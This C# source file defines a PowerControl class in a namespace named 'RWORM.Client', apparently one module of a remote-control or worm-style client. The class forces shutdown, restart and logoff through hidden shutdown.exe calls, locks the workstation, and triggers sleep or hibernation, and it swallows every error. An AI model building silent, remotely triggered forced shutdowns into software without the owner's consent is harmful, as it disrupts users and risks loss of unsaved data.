using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace RWORM.Client.Modules
{
    public static class PowerControl
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool LockWorkStation();

        [DllImport("PowrProf.dll", SetLastError = true)]
        private static extern bool SetSuspendState(bool hibernate, bool forceCritical, bool disableWakeEvent);

        public static void Shutdown()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown.exe",
                    Arguments = "/s /t 0 /f",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch { }
        }

        public static void Restart()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown.exe",
                    Arguments = "/r /t 0 /f",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch { }
        }

        public static void Logoff()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown.exe",
                    Arguments = "/l /f",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch { }
        }

        public static void Lock()
        {
            try
            {
                LockWorkStation();
            }
            catch { }
        }

        public static void Sleep()
        {
            try
            {
                SetSuspendState(false, true, true);
            }
            catch { }
        }

        public static void Hibernate()
        {
            try
            {
                SetSuspendState(true, true, true);
            }
            catch { }
        }
    }
}
